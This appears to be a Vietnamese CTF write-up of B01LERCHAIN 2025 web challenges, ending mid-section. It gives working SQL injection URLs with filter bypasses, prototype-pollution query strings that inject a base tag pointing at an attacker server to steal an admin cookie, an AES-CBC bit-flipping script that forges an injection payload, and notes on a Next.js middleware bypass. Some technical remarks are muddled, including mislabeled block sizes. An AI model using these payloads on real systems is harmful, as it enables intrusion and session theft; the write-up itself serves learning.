---
title: B01LERCHAIN 2025
date: 2025-06-28
draft: false
description: "a description"
tags: ["web", "B01LERCHAIN"]
---

# B01LERCHAIN 2025

![image](https://hackmd.io/_uploads/B1SZTPdkle.png)

## trouble at the spa

![image](https://hackmd.io/_uploads/S1TUtgW1ge.png)
![image](https://hackmd.io/_uploads/S1WTfZfJgx.png)
-> có vẻ như là vào được `/flag` là lấy được flag tuy nhiên nó launch trên github mà github chỉ nhận những trang có sẵn như `html, css` Như vậy:

- `https://ky28060.github.io/flag` -> thực chất là `https://ky28060.github.io/flag/index.html` -> 404 NotFound
  => làm cách nào đó đến đến được flag
  => đúng thật là địa chỉ vật lí trong git không tồn tại flag thật
  ![image](https://hackmd.io/_uploads/HkxQS-Zklg.png)
  Như vậy đi theo đường URL có vẻ sai sai
  :::success
  sẽ ra sao nếu như mình thay đổi URL mà không cần reload lại trang web
  bới nếu reload lại trang web thì nó sẽ lấy địa chỉ vật lí ở trong git
  tuy nhiên
  cái mình cần là tác vụ `flag` của nó được xử lí
  :::
  Sau khi search thì mình thấy cái này có thể thay đổi được url mà không cần phải reload
  [Tài Liệu](https://www.30secondsofcode.org/js/s/modify-url-without-reload/)

```python!
window.history.pushState({}, '', '/flag');
```

Áp dụng vào thì mình thấy nó thực sự đã thay đổi được url mà không cần reload tuy nhiên chưa có gì xảy ra ở đây
![image](https://hackmd.io/_uploads/S1D56XZkxx.png)
Có vẻ như cần 1 câu lệnh gì đó để nó upadte trạng thái của url

```python!
window.dispatchEvent(new PopStateEvent('popstate'));
```

![image](https://hackmd.io/_uploads/Hksa6mbkgl.png)
`FLAG:bctf{r3wr1t1ng_h1st0ry_1b07a3768fc}`

## defense-in-depth

![image](https://hackmd.io/_uploads/r1HjNJfyxx.png)
![image](https://hackmd.io/_uploads/HJio4yMJee.png)
với payload này

```python!
GET /info/a'UNION SELECT * from secrets WHERE key = 'flag HTTP/2
```

![image](https://hackmd.io/_uploads/ry07SkM1el.png)
Có vẻ như SQLi nhưng chưa biết bypass qua như nào
![image](https://hackmd.io/_uploads/BJzADkzJlg.png)

---

![image](https://hackmd.io/_uploads/HJndFxMyle.png)

```python!
GET /info/a'UNION SELECT * from `s``e``c``r``e``t``s` WHERE key = 'flag HTTP/2
```

Khó nhỉ ; có vẻ như trong SQLite này thì muốn truy vấn phải gọi tên bảng
![image](https://hackmd.io/_uploads/S1ShlWfJxg.png)

```python!
GET /info/' UNION SELECT * FROM "sec" || "rets" /**/S HTTP/2
```

![image](https://hackmd.io/_uploads/BJTNb-fylg.png)

```python!
GET /info/' UNION SELECT * FROM secrets  where key='flag HTTP/2
```

Tuy nhiên chính vì check như này :

![image](https://hackmd.io/_uploads/H1OW0qNyeg.png)
![image](https://hackmd.io/_uploads/HyA4Ac41xl.png)

Mà a dev bỏ qua 1 mặt phẳng tấn công khác đó là `comment`
:::danger
Sẽ ra sao nếu secrets rơi vào comment
:::

```python=
/*!50000 union select `key`,`value`,3 from secrets where `key`='flag' */
```

- Đây là phần comment Vậy đưa nó vào câu query là được
- Đây là MySQL versioned comment → chỉ thực thi nếu MySQL phiên bản ≥ 5.000.

Tuy nhiên khi đưa lên `url`
`https://defense-in-depth.harkonnen.b01lersc.tf/info/x'/*!50000%20union%20select%20%60key%60,%60value%60,3%20from%20secrets%20where%20%60key%60='flag'%20*/%20'`
Nó trả về
![image](https://hackmd.io/_uploads/r1jpvaEyeg.png)
Vậy tại sao
nó sẽ mắc ở 1 trong ba luận lí
![image](https://hackmd.io/_uploads/r11GdTEkxx.png)
Hoặc
![image](https://hackmd.io/_uploads/ryrtOp4Jex.png)
![image](https://hackmd.io/_uploads/B1s3g0E1el.png)
Hoặc
![image](https://hackmd.io/_uploads/BJXpqpVyll.png)
nếu bỏ đi phần comment câu truy vấn của chúng ta sẽ có dạng
`SELECT * from users WHERE name = 'k' ''`

![image](https://hackmd.io/_uploads/rJ4UjaE1xe.png)
Vậy chỉ có thể là lỗi Syntax cần 1 kí tự nào đó để chèn vào giữa cho nó hợp lệ . Và đó là `order by`
`SELECT * from users WHERE name = 'k' order by ''`
![image](https://hackmd.io/_uploads/BJG8hpVyxe.png)
Vậy giờ hãy gắn khẩu súng vào nào
Câu lệnh sẽ là
`SELECT * from users WHERE name = 'k' {payload} order by 'x'`
PAYLOAD
`/*!50000%20union%20select%20%60key%60,%60value%60,3%20from%20secrets%20where%20%60key%60='flag'*/`
URL sẽ có dạng
`https://defense-in-depth.harkonnen.b01lersc.tf/info/`
`k' `
`/*!50000%20union%20select%20%60key%60,%60value%60,3%20from%20secrets%20where%20%60key%60='flag'*/`
`order by 'x`
![image](https://hackmd.io/_uploads/Sk3YapVJlg.png)
NICE!
FLAG: `bctf{7h1s_1s_prob4bly_the_easiest_web_s0_go_s0lve_smt_3ls3_n0w!!!}`

## No code

![image](https://hackmd.io/_uploads/S14-KGPyxl.png)

---

![image](https://hackmd.io/_uploads/rJ0Jr1BJll.png)
Đọc đến có vẻ là lấy cookie là xong
Sơ qua về `admin-bot/app/index.js` xử lí 1 url , truy cập đến nó -> mở 1 browser Context chứa **flag** ở **cookie** và 1 trang mới để truy cập URL với `timeout` 5s
Chưa thấy liên quan gì đến `routeLinks()` ở bên `app/scripts/routing.js`
Đọc qua thì thấy cơ chế của bài này là con `admin` truy cập vào `URL` của trang `no code` này . Bên cạnh đó `admin-bot` gán `cookie` vào tên miền mình vừa truy cập .
:::success
Nhiệm vụ của mình là làm sao để truy cập vào tên miền đó mà có thể lấy được `cookie` cái mà vừa được gắn vào `domain` của trang `web` chính
:::

![image](https://hackmd.io/_uploads/rk16lmP1lx.png)
Chat : lỗ hổng `prototype pollution` trong `module @fastify/formbody` (hoặc các plugin liên quan như `fastify-multipart`) được xác định với mã `CVE-2020-8136`. Lỗ hổng này ảnh hưởng đến các phiên bản của fastify-multipart trước 1.0.5, cho phép kẻ tấn công gửi các yêu cầu `multipart` được chế tạo đặc biệt để thao túng `prototype` của đối tượng, dẫn đến khả năng crash ứng dụng hoặc thực hiện các hành vi không mong muốn

1. Đầu tiên ta sẽ request đến url của trang phụ để thay đổi prototype
   ![image](https://hackmd.io/_uploads/H1YOYmwkgx.png)
   Do phần parse của con trang phụ này cũng không sanitize các `prototype malicious`

```python==
function parseQuery(query) {
	query = query.replace(/$\?/, "");
	const params = query.split("&");
	const result = {};
	for (const param of params) {
		const [key, value] = param.split("=").map(decodeURIComponent);
		if (key.includes("[")) {
			const parts = key.split("[").map((part) => part.replace(/]$/, ""));
			let curr = result;
			for (let part of parts.slice(0, -1)) {
				if (curr[part] === undefined) {
					curr[part] = {};
				}
				curr = curr[part];
			}
			curr[parts[parts.length - 1]] = value;
		} else {
			result[key] = value;
		}
	}
	return result;
}

```

Request đến nó nào
![image](https://hackmd.io/_uploads/ByPcYQD1lg.png)
![image](https://hackmd.io/_uploads/rkPrcQD1gx.png)
**đây là ban đầu**
![image](https://hackmd.io/_uploads/rk9acmDyex.png)
**lúc sau**
đây là điều mình muốn

```python!
{
    __proto__: {
        children: {
            0: {
                tag: "base",
                attributes: {
                    href: "attacker_url"
                }
            }
        }
    }
}
```

dùng tag `base` để thay đổi url ; Khi đó thay vì load `url` trang web thì đoạn `url` của attack sẽ được load lên
sau khi đã load các các `prortotype malicious` lên giờ sẽ làm gì đó để `admin` đọc được payload sau đó thực hiện `fetch` đến `webhook` mang theo món bánh mlem mlem
Khi reload trang phụ thì đã nhận được request đến `webhook` => đã thâu tóm được `prototype`
:::danger
Tuy nhiên việc của mình là lấy được cookie của admin cơ
:::
![image](https://hackmd.io/_uploads/BJfZQpwkge.png)
Reload lại trang web thì đã `fetch` được .
Gửi cho admin trang đã thâu tóm `prototype` nhưng vẫn không `fetch` được . Vậy do đâu .
...........
Hơi bí đợi writeup BTC vậy
:::danger
AUKE CHỮA BÀI
Đây là chủ đề về prototype pollution + xss => lấy cookie(đúng như dự đoạn của mình)
Ngay ở trong code của admin bot đã có phần `Parse` và đưa vào bên trong 1 `query`
![image](https://hackmd.io/_uploads/SJrhS6Oegx.png)
Giá trị trả về là 1 đối tượng với các thuộc tính

```php!
{
  a: "1",
  b: "2",
  c: { d: "3" }
}
```

luận lí sẽ như sau
![image](https://hackmd.io/_uploads/rk0N6Tugge.png)
Như ta đã thấy khi mà `obj.childern` tồn tại . Nó sẽ thay thế hết tất cả thuộc tính mà mình đưa vào => đây sẽ là `prototype pollution`
thực hành luôn với payload

```php!
http://localhost:8000/index
  ?__proto__[children][0][tag]=script
  &__proto__[children][0][attributes][src]=a
```

sau khi đã query đến thì ta được sự khác biệt như sau
![image](https://hackmd.io/_uploads/ByVbQC_egl.png)
Ta thấy đã xuất hiện `children`
Vậy lợi dụng nó để thực thi javascript trong và lấy được **cookie**
Tuy nhiên mình nhận ra 1 vấn đề -> thể script trong payload đã biến mất ?????? 😪
![image](https://hackmd.io/_uploads/Skh54Rulgx.png)
Trong JavaScript `array-like` cần có thuộc tính `length` thì mới hợp lệ

```php!
{
  "__proto__": {
    "children": {
      "0": {
        "tag": "script",
        "attributes": {
          "src": "a"
        }
      },
      "length": 1
    }
  }
}
```

auke thử lại nào

```php!
http://localhost:8000/index
  ?__proto__[children][0][tag]=script
  &__proto__[children][0][attributes][src]=a
  &__proto__[children][length]=1
```

![image](https://hackmd.io/_uploads/rkuQBAulgx.png)
HỪm lại gì nữa đây ?
Như ta thấy ở trên Phần `replaceAllProps` nó gọi đệ quy nên sẽ là vô tận bởi vì `children ` luôn luôn được định nghĩa, Nhưng có vẻ là sắp đúng r
`pollute` vào `__proto__` chỉ cần làm 1 lần

```php!
http://localhost:8000/index
  ?__proto__[children][0][tag]=script
  &__proto__[children][0][attributes][src]=a
  &__proto__[children][length]=1
  &__proto__[children][0][children]=0
```

![image](https://hackmd.io/_uploads/S18-d0uegg.png)
Auke đã xong

```php!
reply.header(
  "content-security-policy",
  `require-trusted-types-for 'script'; trusted-types 'none'`
);

```

tuy nhiên `script` không thực sự thực thi được do content security policy (csp)
Vậy thay bằng `<base>`

```php!
http://localhost:8000/
  ?__proto__[children][0][tag]=base
  &__proto__[children][0][attributes][href]=https://your-server
  &__proto__[children][length]=1
  &__proto__[children][0][children]=0
```

Thẻ base sẽ khiến cho việc load script từ server của attaker trước url thực sự cần load
![image](https://hackmd.io/_uploads/Skeu90uexx.png)
Vậy nên ta tiêm `<base href="https://your-server">` trước `<script src="/scripts/routing.js"> ` , chúng sẽ load `https://your-server/scripts/routing.js,` bypass được qua csp
giờ sẽ launch 1 con server chứa payload `fetch` lên
![image](https://hackmd.io/_uploads/rJDS91Yxge.png)
![image](https://hackmd.io/_uploads/BkgU5Jtgle.png)

ok giờ đây mình ấn cái gì vào trang web cũng chuyển đến server mình => có nghĩa là nó thực sự đã render server của mình trước những đường url khác
![image](https://hackmd.io/_uploads/Byi25kYege.png)
![image](https://hackmd.io/_uploads/ByZJ3yFele.png)

Như vậy đã XSS thành công
bởi vì prototype pollution vẫn còn đó nên xss vẫn còn đó => giờ đưa url lên con bot
ở local không lấy được vì regex đang check cùng tên miền
đây là payload trong thực tế

```php!
http://localhost:8000/
  ?__proto__[children][0][tag]=base
  &__proto__[children][0][attributes][href]=http://172.20.10.3
  &__proto__[children][length]=1
  &__proto__[children][0][children]=0
```

không chứng minh bằng cách cướp Cookie => do ban tổ chức đã reg `url` vậy sẽ chứng minh bằng XSS `alert()`
![image](https://hackmd.io/_uploads/rJcYT5tgxe.png)
![image](https://hackmd.io/_uploads/Ska9T5tgxx.png)
![image](https://hackmd.io/_uploads/rkPl09Yxxe.png)
Như vậy đã thực thi được payload
:::

## Atom Bomb

![image](https://hackmd.io/_uploads/BkGGaTwklx.png)
Bài nay `logic` khá đơn giản chỉ là `click` vào `button` để lấy thông tin
Khi `click` vào thì nó sẽ có hai phương thức `GET` -> `POST`
![image](https://hackmd.io/_uploads/B1-jeOuJxx.png)
Sau đó `POST`
![image](https://hackmd.io/_uploads/Hy5yZdO1eg.png)
Chưa có ý tưởng gì mới

## musicplayer

![image](https://hackmd.io/_uploads/r1m3Estyee.png)

## what the crypto

![image](https://hackmd.io/_uploads/ryvu05Kggx.png)
Bài này SQLi lấy key của admin là được

1. Người dùng gửi 1 yêu cầu `post` lên server
2. decode `username` và `passwd`
3. đưa đến `get`
4. Giải mã `usr` và `passwd` và sau đó thực thi query

![image](https://hackmd.io/_uploads/BJ3qBotlxg.png)
đương nhiên có filter ở đây
![image](https://hackmd.io/_uploads/rkLKUjYxge.png)
Test thử lại luộn lí mà server xử lí passwd username

```python==
# Install pycryptodome package first: pip install pycryptodome
from Crypto.Cipher import AES
import base64
import flask
import os
import sqlite3
import tempfile
import urllib

from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes
sha = SHA256.new() # tạo 1 hash SHA256
flag = "bctf{fake}"
sha.update(flag.encode()) # hash flag
key = sha.digest()[:16] # lấy 16 byte đầu tiên của hash

username = 'tung'

password = '123456'
padded1 = (username + " " * (-len(username) % AES.block_size)).encode() # padding username
padded2 = (password + " " * (-len(password) % AES.block_size)).encode() # padding password

cipher = AES.new(key, AES.MODE_CBC)
ciphertext1 = cipher.iv + cipher.encrypt(padded1)
cipher = AES.new(key, AES.MODE_CBC)
ciphertext2 = cipher.iv + cipher.encrypt(padded2)

encoded1 = ciphertext1.hex()
encoded2 = ciphertext2.hex()

ciphertext1 = bytes.fromhex(encoded1) # chuyển username từ hex sang bytes
ciphertext2 = bytes.fromhex(encoded2) # chuyển password từ hex sang bytes

cipher = AES.new(key, AES.MODE_CBC, ciphertext1[:16]) # giải mã username
padded1 = cipher.decrypt(ciphertext1[16:]) # giải mã username
cipher = AES.new(key, AES.MODE_CBC, ciphertext2[:16]) # giải mã password
padded2 = cipher.decrypt(ciphertext2[16:]) # giải mã password

username = padded1.decode("ascii", errors="replace").rstrip(" ") # chuyển username từ bytes sang ascii và loại bỏ khoảng trắng ở cuối
password = padded2.decode("ascii", errors="replace").rstrip(" ") # chuyển password từ bytes sang ascii và loại bỏ khoảng trắng ở cuối

print(username, password)
```

![image](https://hackmd.io/_uploads/r16CKotexl.png)
Như vậy mình phải sql làm sao mà đi được qua đây trong khi bị filter các kí tự đặc biệt
Mình thấy ở đây có hai cách :

1. chúng ta không thể đưa các kí tự đặc biệt sau đó mã hóa nó -> không có key
1. Bởi vậy ta có phương thức `POST` trong phương thức này sẽ mã hóa dữ liệu (có sẵn key) -> Đưa đến GET để giải mã -> thực hiện truy vấn
   Vậy làm cách nào để inject được trong khi cả hai con đường đều bế tắc .
   Nhìn chung thì con đường hai dễ hơn là mò được key 👌
   :::success
   Sẽ ra sao nếu anh dev mã hóa không an toàn ?????
   :::
   Phía server sử dụng mã hóa AES (Advanced Encryption Standard)
1. Padding lại `username` để đủ 16 byte
1. Tạo `cipher.iv` (chuỗi ngẫu nhiên 16 byte)
1. Sau đó `xor` hai cái với nhau
1. nối cipher.iv + kết quả trên
1. Encode Hex
1. Gửi đi
   ![image](https://hackmd.io/_uploads/By8Clrcxeg.png)

Giải thích qua về luận lí của mã hoá AES-CBC

```python!
C₀(32BYTE) = IV(32BYTE)
C₁(32BYTE) = Eₖ(P₁(16BYTE) ⊕ C₀(32BYTE))
C₂(32BYTE) = Eₖ(P₂(16BYTE) ⊕ C₁(32BYTE))
C₃(32BYTE) = Eₖ(P₃(16BYTE) ⊕ C₂(32BYTE))
```

Và giải mã thì ban đầu sẽ encode hex sau đó

```python!
P₁ = Dₖ(C₁) ⊕ C₀ -> tuỳ chỉnh C0 để thâu tóm p1
P₂ = Dₖ(C₂) ⊕ C₁ -> do đoạn trên c1 đã thâu tóm nên p2 vô nghĩa
P₃ = Dₖ(C₃) ⊕ C₂ -> điều chỉnh c2 để thâu tóm p3
```

dùng kĩ thuật `AES CBC Bit Flipping Attack`
mấu chốt nằm ở đây

```python!
xor(uname_blocks[0], xor(block[:len(query_part1)], query_part1))
```

Nghĩa là từ 1 đoạn hex (đúng được lấy ra từ key real) -> `uname_blocks[0]` ta xor để tạo ra 1 đoạn hex khác sao cho
Hơi bí nên tìm cách khác

```python!
    fixed_iv = b'0123456789abcde4'
    cipher = AESCipher(key)
    ctx = cipher.encrypt(msg, iv=fixed_iv).decode('utf-8')
    print('Ciphertext     :', ctx)


    xors = [
        0x42 ^ 0x27,  # B ^ ' = 0x42 ^ 0x27 = 0x65
        0x75 ^ 0x4F,  # u ^ O = 0x75 ^ 0x4F = 0x3A
        0x79 ^ 0x52,  # y ^ R = 0x79 ^ 0x52 = 0x2B
        0x20 ^ 0x20,  # ' ' ^ ' ' = 0x20 ^ 0x20 = 0x00 (không cần thay đổi)
        0x31 ^ 0x2F,  # 1 ^ / = 0x31 ^ 0x2F = 0x1E
        0x30 ^ 0x2A   # 0 ^ * = 0x30 ^ 0x2A = 0x1A
    ]

    # Thực hiện bit flip tại các vị trí trong IV (0-5)
    flipped_ctx = ctx
    for i, xor_val in enumerate(xors):
        if xor_val != 0:  # Chỉ flip nếu cần thay đổi
            flipped_ctx = bitFlip(i, xor_val, flipped_ctx)

    print('Cipher After :', flipped_ctx)
```

![image](https://hackmd.io/_uploads/BJqQaAceel.png)

1. Giờ bắt đầu với `'OR /*`

```python!
    xors = [
        0x42 ^ 0x2A,  # B ^ * = 0x42 ^ 0x2A = 0x68
        0x75 ^ 0x2F,  # u ^ / = 0x75 ^ 0x2F = 0x5A
        0x79 ^ 0x61,  # y ^ a = 0x79 ^ 0x61 = 0x18
        0x20 ^ 0x75,  # ' ' ^ u = 0x20 ^ 0x75 = 0x55
        0x31 ^ 0x74,  # 1 ^ t = 0x31 ^ 0x74 = 0x45
        0x30 ^ 0x68   # 0 ^ h = 0x30 ^ 0x68 = 0x58
    ]
```

Như vậy sau khi giải mã thì chuỗi mong đợi sẽ là `'OR /*00 lots of waffles`
đây sẽ 32 byte đầu tiên của payload `VQsZMyovNjc4OWFiY2RlNPq1mzaJY8Av5V9AzZIH53Ni8Geho6pvdPJw7GkROUdB`

2. tiếp tục với `*/auth_secret/*`

```python!
    xors = [
        0x42 ^ 0x2A,  # B ^ * = 0x42 ^ 0x2A = 0x68
        0x75 ^ 0x2F,  # u ^ / = 0x75 ^ 0x2F = 0x5A
        0x79 ^ 0x61,  # y ^ a = 0x79 ^ 0x61 = 0x18
        0x20 ^ 0x75,  # ' ' ^ u = 0x20 ^ 0x75 = 0x55
        0x31 ^ 0x74,  # 1 ^ t = 0x31 ^ 0x74 = 0x45
        0x30 ^ 0x68,  # 0 ^ h = 0x30 ^ 0x68 = 0x58
        0x30 ^ 0x5F,  # 0 ^ _ = 0x30 ^ 0x5F = 0x6F
        0x30 ^ 0x73,  # 0 ^ s = 0x30 ^ 0x73 = 0x43
        0x20 ^ 0x65,  # ' ' ^ e = 0x20 ^ 0x65 = 0x45
        0x6C ^ 0x63,  # l ^ c = 0x6C ^ 0x63 = 0x0F
        0x6F ^ 0x72,  # o ^ r = 0x6F ^ 0x72 = 0x1D
        0x74 ^ 0x65,  # t ^ e = 0x74 ^ 0x65 = 0x11
        0x73 ^ 0x74,  # s ^ t = 0x73 ^ 0x74 = 0x07
        0x20 ^ 0x2F,  # ' ' ^ / = 0x20 ^ 0x2F = 0x0F
        0x6F ^ 0x2A   # o ^ * = 0x6F ^ 0x2A = 0x45
    ]
```

`Buy 1000 lots of waffles` -> `*/auth_secret/*f waffles`
32byte tiếp theo là `WGsqZnFtWXR9NnxzZGsgNPq1mzaJY8Av5V9AzZIH53Ni8Geho6pvdPJw7GkROUdB`

3. giờ sẽ là `*/LIKE/*`

```python!
    xors = [
        0x42 ^ 0x2A,  # B ^ * = 0x42 ^ 0x2A = 0x68
        0x75 ^ 0x2F,  # u ^ / = 0x75 ^ 0x2F = 0x5A
        0x79 ^ 0x4C,  # y ^ L = 0x79 ^ 0x4C = 0x35
        0x20 ^ 0x49,  # ' ' ^ I = 0x20 ^ 0x49 = 0x69
        0x31 ^ 0x4B,  # 1 ^ K = 0x31 ^ 0x4B = 0x7A
        0x30 ^ 0x45,  # 0 ^ E = 0x30 ^ 0x45 = 0x75
        0x30 ^ 0x2F,  # 0 ^ / = 0x30 ^ 0x2F = 0x1F
        0x30 ^ 0x2A   # 0 ^ * = 0x30 ^ 0x2A = 0x1A
    ]

```

`Buy 1000 lots of waffles` -> `*/LIKE/* lots of waffles`
32 byte tiếp theo `WGsHWk5AKS04OWFiY2RlNPq1mzaJY8Av5V9AzZIH53Ni8Geho6pvdPJw7GkROUdB`

4. tiếp theo là `*/'%$gram%';--`

```python!
 xors = [
        0x42 ^ 0x2A,  # B ^ * = 0x42 ^ 0x2A = 0x68
        0x75 ^ 0x2F,  # u ^ / = 0x75 ^ 0x2F = 0x5A
        0x79 ^ 0x27,  # y ^ ' = 0x79 ^ 0x27 = 0x5E
        0x20 ^ 0x25,  # ' ' ^ % = 0x20 ^ 0x25 = 0x05
        0x31 ^ 0x24,  # 1 ^ $ = 0x31 ^ 0x24 = 0x15
        0x30 ^ 0x67,  # 0 ^ g = 0x30 ^ 0x67 = 0x57
        0x30 ^ 0x72,  # 0 ^ r = 0x30 ^ 0x72 = 0x42
        0x30 ^ 0x61,  # 0 ^ a = 0x30 ^ 0x61 = 0x51
        0x20 ^ 0x6D,  # ' ' ^ m = 0x20 ^ 0x6D = 0x4D
        0x6C ^ 0x25,  # l ^ % = 0x6C ^ 0x25 = 0x49
        0x6F ^ 0x27,  # o ^ ' = 0x6F ^ 0x27 = 0x48
        0x74 ^ 0x3B,  # t ^ ; = 0x74 ^ 0x3B = 0x4F
        0x73 ^ 0x2D,  # s ^ - = 0x73 ^ 0x2D = 0x5E
        0x20 ^ 0x2D   # ' ' ^ - = 0x20 ^ 0x2D = 0x0D
    ]

```

`Buy 1000 lots of waffles` -> `*/'%$gram%';--of waffles`
32 byte cuối
`WGtsNiFidGZ1cCktPWllNPq1mzaJY8Av5V9AzZIH53Ni8Geho6pvdPJw7GkROUdB`
auke để check lại thì giờ sẽ thử giải mã lại xem sao
đây là payload cuối cùng

```python!
VQsZMyovNjc4OWFiY2RlNPq1mzaJY8Av5V9AzZIH53Ni8Geho6pvdPJw7GkROUdBWGsqZnFtWXR9NnxzZGsgNPq1mzaJY8Av5V9AzZIH53Ni8Geho6pvdPJw7GkROUdBWGsHWk5AKS04OWFiY2RlNPq1mzaJY8Av5V9AzZIH53Ni8Geho6pvdPJw7GkROUdBWGtsNiFidGZ1cCktPWllNPq1mzaJY8Av5V9AzZIH53Ni8Geho6pvdPJw7GkROUdB
```

![image](https://hackmd.io/_uploads/SJIIBJiexg.png)

`'OR /*00 lots of waffles*/auth_secret/*f waffles*/LIKE/* lots of waffles*/'%$gram%';--of waffles`
auke giở chỉ cần đưa vào vòng lặp sau đó check từng kí tự là ok
`'OR /*00 lots of waffles*/auth_secret/*f waffles*/LIKE/* lots of waffles*/'btcf{..';--of waffles`

-> `'OR auth_secret LIKE'btcf{..';`
đây là code sinh payload của từng phần

```python!
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

class AESCipher:
    def __init__(self, key):
        self.key = key

    def encrypt(self, data, iv=None):
        if iv is None:
            iv = get_random_bytes(AES.block_size)
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return b64encode(iv + self.cipher.encrypt(pad(data.encode('utf-8'), AES.block_size)))

    def decrypt(self, data):
        raw = b64decode(data)
        self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])
        return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)

def bitFlip(pos, bit, data):
    raw = b64decode(data)
    list1 = list(raw)
    list1[pos] = list1[pos] ^ bit
    raw = bytes(list1)
    return b64encode(raw)

if __name__ == '__main__':
    key = b'Sixteen byte key'
    msg = "Buy 1000 lots of waffles"

    print('Original Message:', msg)

    # Sử dụng IV cố định
    fixed_iv = b'0123456789abcde4'
    cipher = AESCipher(key)
    ctx = cipher.encrypt(msg, iv=fixed_iv).decode('utf-8')
    print('Ciphertext     :', ctx)

    # Tính toán các giá trị XOR để thay đổi bản rõ thành "*/'%$gram%';--"
    xors = [
        0x42 ^ 0x2A,  # B ^ * = 0x42 ^ 0x2A = 0x68
        0x75 ^ 0x2F,  # u ^ / = 0x75 ^ 0x2F = 0x5A
        0x79 ^ 0x27,  # y ^ ' = 0x79 ^ 0x27 = 0x5E
        0x20 ^ 0x25,  # ' ' ^ % = 0x20 ^ 0x25 = 0x05
        0x31 ^ 0x24,  # 1 ^ $ = 0x31 ^ 0x24 = 0x15
        0x30 ^ 0x67,  # 0 ^ g = 0x30 ^ 0x67 = 0x57
        0x30 ^ 0x72,  # 0 ^ r = 0x30 ^ 0x72 = 0x42
        0x30 ^ 0x61,  # 0 ^ a = 0x30 ^ 0x61 = 0x51
        0x20 ^ 0x6D,  # ' ' ^ m = 0x20 ^ 0x6D = 0x4D
        0x6C ^ 0x25,  # l ^ % = 0x6C ^ 0x25 = 0x49
        0x6F ^ 0x27,  # o ^ ' = 0x6F ^ 0x27 = 0x48
        0x74 ^ 0x3B,  # t ^ ; = 0x74 ^ 0x3B = 0x4F
        0x73 ^ 0x2D,  # s ^ - = 0x73 ^ 0x2D = 0x5E
        0x20 ^ 0x2D   # ' ' ^ - = 0x20 ^ 0x2D = 0x0D
    ]

    # Thực hiện bit flip tại các vị trí trong IV (0-13)
    flipped_ctx = ctx
    for i, xor_val in enumerate(xors):
        if xor_val != 0:  # Chỉ flip nếu cần thay đổi
            flipped_ctx = bitFlip(i, xor_val, flipped_ctx)

    print('Cipher After   :', flipped_ctx)

    # Giải mã và xử lý lỗi UTF-8
    try:
        decrypted_msg = cipher.decrypt(flipped_ctx).decode('utf-8')
    except UnicodeDecodeError:
        decrypted_msg = cipher.decrypt(flipped_ctx).decode('utf-8', errors='replace')
    print('Decrypted Message:', decrypted_msg)

    # Kiểm tra kết quả
    expected_flipped_msg = "*/'%$gram%';--"
    print('Expected Message :', expected_flipped_msg)
    print('Match?           :', decrypted_msg.startswith(expected_flipped_msg))

```

## njaas

![image](https://hackmd.io/_uploads/HyGqakillg.png)
**Ý tưởng** : làm như thế nào đấy để request đến trang có chứa flag . Đương nhiên trang này là của admin (trong thử thách này khi ta truy cập url `admin/flag` -> thì nó sẽ auto chuyển ta về trang `home` )
![image](https://hackmd.io/_uploads/rk3_hDogge.png)
MỘT VÀI KIẾN THỨC CẦN NẮM

1.  :::info
    Trước hết mình phải hiểu `middleware` dùng trong NextJs:  
    Nó đơn giản là 1 trạm trung chuyển giữa client với server với nhiều mục đích khác nhau
1.  xác thực -> như bài lab này
1.  điều khiển lưu lượng mạng
    ......

::: 2.
:::info
Khi có 1 endpoint `admin/flag`
Trong server của nextJS sẽ tự động gen ra endpoint JSON đó là `/_next/data/<build-id>/admin/flag.json`
Mục đích để phục vụ đúng nội dung yêu cầu tránh việc lãng phí tài nguyên
đây gọi là cơ chế `UrlNormalize`
và sau đó cơ chế này sẽ được làm ngược lại `_next/data/<build-id>/admin/flag.json` -> `admin/flag`
Tuy nhiên nếu thiết lập `skipMiddlewareUrlNormalize` thì URL sẽ vẫn là `_next/data/<build-id>/admin/flag.json` -> Như vậy là sẽ không còn `matcher` với `/admin /:path*` nữa -> bypass qua middleware
:::

Theo như gợi ý thì có vẻ như có vấn đề gì đấy với `header`
Ý tưởng của bài lab này tác giả đã dựa vào `CVE-2025-29927`

:::warning
Ở bản patch của CVE này trưởng `x-middleware-subrequest` giờ không còn được tuỳ tiện gửi nữa mà muốn xác thực nó phải có `middlewareSubrequestId ` tuy nhiên nó là số random (không thể đoán được) -> vậy có cách nào để leak được `idAuth` đó ra là pwn
:::

`proxy/app.py`

```python=
@app.route('/csrf', methods=['POST']) # thiết lập csrf token
def csrf(): # thiết lập csrf token
    token = request.form.get('token', token_hex(16))[:30].strip().encode("utf-8") # lấy csrf token từ form
    if len(token) < 20:
        return Response('Insecure CSRF Token.', status=500)
    try:
        clear_csrf() # xóa csrf token cũ
        environ[token.decode("utf-8", errors="ignore")] = CSRF_TOKEN # thiết lập csrf token mới
        token = int(token, 16) # chuyển csrf token thành số thập lục phân
        return Response('Set valid CSRF Token.', status=200)
    except ValueError:
        return Response('CSRF Token must be hex.', status=500) # csrf token phải là số thập lục phân

```

-> Chúng ta có thẻ set token tuỳ ý có chiều dài `20 -> 30`. Tuy nhiên không làm được gì hơn vì `token = int(token, 16)` sẽ là random
Bởi vì app này chạy `subprocess.run` nên ENV VAR được thiết lập ở `/csrf` cũng sẽ được giữ lại trong suốt chương trình

`proxy/app.py`

```python=
def start():
    clear_csrf() # xóa csrf token cũ
    environ['CSRF_TOKEN'] = CSRF_TOKEN # thiết lập csrf token mới
    global STARTED  # khai báo biến global
    if STARTED:
        return Response("Start already initiated", status=428)
    with start_lock: # khai báo lock
        if STARTED: # nếu đã khởi động thì trả về lỗi
            return Response("Start already initiated", status=428)
        STARTED = True
        try:
            run(['sleep', '3'], check=False) # make sure lock is aquired
            run(['./start.sh'], cwd='../next', check=True)
            return Response("Starting 👍...", status=200)
        except CalledProcessError as e:
            return Response(f"Start Error: {str(e)}", status=500)
        except Exception as e:
            return Response(f"Unexpected Error: {str(e)}", status=500)
```

-> ở hàm `start` này như ta đã thấy nó sẽ xoá đi token được thiết lập từ endpoint `/csrf` . Sau đó là token random mới -> ngủ 3s -> `start` `NEXTJS`
Vậy làm sao để thiết lập được token theo ý mình
:::danger
race condition
:::
:::success
Sẽ ra sao nếu chúng ta đợi nó xoá `token` sau đó set `token` theo ý mình rồi nó thực thi `start` -> phải set trong vòng < `3s`
:::

1 vài research từ CVE-2025-29927 có được 1 vài header malicious (dành cho nội bộ của trang)

```python=
// These are headers that are only used internally and should
